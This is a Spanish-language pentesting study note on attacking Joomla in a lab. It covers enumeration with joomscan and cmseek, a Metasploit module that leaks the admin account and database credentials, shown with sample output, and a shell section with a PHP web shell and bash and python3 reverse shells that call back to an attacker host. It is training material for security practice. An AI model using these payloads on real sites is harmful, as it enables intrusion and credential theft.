# Joomla 

Tags: #Joomla #CMS  

## Enumeración de gestores de contenido (CMS) – Joomla

Joomla es un sistema de gestión de contenidos (CMS) de código abierto que se utiliza para **crear sitios web** y **aplicaciones en línea**. Joomla es muy popular debido a su facilidad de uso y flexibilidad, lo que lo hace una opción popular para sitios web empresariales, gubernamentales y de organizaciones sin fines de lucro.

Joomla es altamente personalizable y cuenta con una gran cantidad de extensiones disponibles, lo que permite a los usuarios añadir funcionalidades adicionales a sus sitios web sin necesidad de conocimientos de programación avanzados. Joomla también cuenta con una comunidad activa de desarrolladores y usuarios que comparten sus conocimientos y recursos para mejorar el CMS.

A continuación, se comparte el enlace del proyecto que estaremos desplegando en Docker para auditar un Joomla:

-   **CVE-2015-8562**: [Joomla](https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562)

Una de las herramientas que usamos en esta clase es **Joomscan**. Joomscan es una herramienta de línea de comandos diseñada específicamente para escanear sitios web que utilizan Joomla y buscar posibles vulnerabilidades y debilidades de seguridad.

Joomscan utiliza una variedad de técnicas de enumeración para identificar información sobre el sitio web de Joomla, como la versión de Joomla utilizada, los plugins y módulos instalados y los usuarios registrados en el sitio. También utiliza una base de datos de vulnerabilidades conocidas para buscar posibles vulnerabilidades en la instalación de Joomla.

Para utilizar Joomscan, primero debemos descargar la herramienta desde su sitio web oficial. A continuación se os proporciona el enlace al proyecto:

-   **Joomscan**: [https://github.com/OWASP/joomscan](https://github.com/OWASP/joomscan)

## Joomla Enumeración 

Esta herramienta además de enumerar un servidor Joomla, nos crea un reporte de las vulnerabilidades que encontró.
**/administrator** Es la ruta del panel de autenticacion de admin

```bash 
❯ sudo apt install joomscan   # Instalación en Kali 
```

```bash 
❯ joomscan -u http://IP/                # Enumerar Joomla (No importa si joomla esta dentro de un dir), obtener versión
❯ cmseek -u http://IP/administrator/    # Enumerar el CMS (Si importa si esta dentro de un dir)
```

## Joomla versión 4.0.0 a 4.2.7 - Obtener credenciales 
```bash 
❯ msfconsole -q    # Ingresar a metasploit
	❯ search auxiliary/scanner/http/joomla_api_improper_access_checks 
	❯ options 
	❯ set RHOST IP    (No importa si joomla esta en un dir /administrator/index.php. Solo colocar la IP)
	❯ run 


# Resultado:

                       IMPORTANTE
                           ↓
 ID   Super User  Name  Username  Email            Send Email  Register Date        Last Visit Date  Group Names
 --   ----------  ----  --------  -----            ----------  -------------        ---------------  -----------
 769  *           Oda   Miyamoto  oda@local.local  1           2026-03-06 00:00:00                   Super Users

[+] Config JSON saved to /root/.msf4/loot/20260924123831_default_10.1.80.211_joomla.config_466015.bin
[+] Joomla Config
=============

 Setting        Value
 -------        -----
 db encryption  0
 db host        localhost
 db name        Dbjoomla
 db password    Pa847word987@Joomla456   ← IMPORTANTE 
 db prefix      iemj4_
 db user        joomla425
 dbtype         mysqli


NOTA:
	- Esas credenciales sirven en el panel de admin e ingresas como 'super user' o en la DB de MYSQL  
```

## Obtener una Shell en Joomla
```bash 
1. Para obtener una shell en Joomla, si contamos con acceso administrativo, podemos modificar un template desde 'System → Site Templates' y agregar código PHP para ejecutar comandos. Debemos identificar la ruta donde está instalado Joomla y el template, ya que podremos acceder al archivo modificado mediante una petición como '?cmd=whoami', permitiendo comprobar la ejecución de comandos y posteriormente obtener una reverse shell.
```

```bash 
Opcion 1. Editar cualquier template 

Paso 1:
# Seleccionar un template y hacer clic en 'New File'. Asignarle el nombre 'pwned', seleccionar la extensión PHP, hacer clic en Create y, finalmente, agregar el código correspondiente. Después de colocar el contenido en PHP guardarlo. 

	<?php 
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	?>

# O colocar una ReverShell directa:

	<?php
	   system("bash -c 'bash -i >& /dev/tcp/IP_kali/443 0>&1'")
	?>


Paso 2:
# En la siguiente URL se puede acceder al archivo creado:
	http://IP/templates/<Template_Name>/pwned.php?cmd=whoami              # Ejecutar un comando

Paso 3:
# URL-encodear la revershell 
	http://IP/templates/<Template_Name>/pwned.php?cmd=which python3       # Verificar si esta instalado python3
	
	http://IP/templates/<Template_Name>/pwned.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket();s.connect((%22IP_Kali%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(%5B%22/bin/bash%22%5D)%27    # Ejecutar la revershell 
```

```bash 
Paso 4:
❯ penelope -p 443    # Recibir la revershell en Kali 
```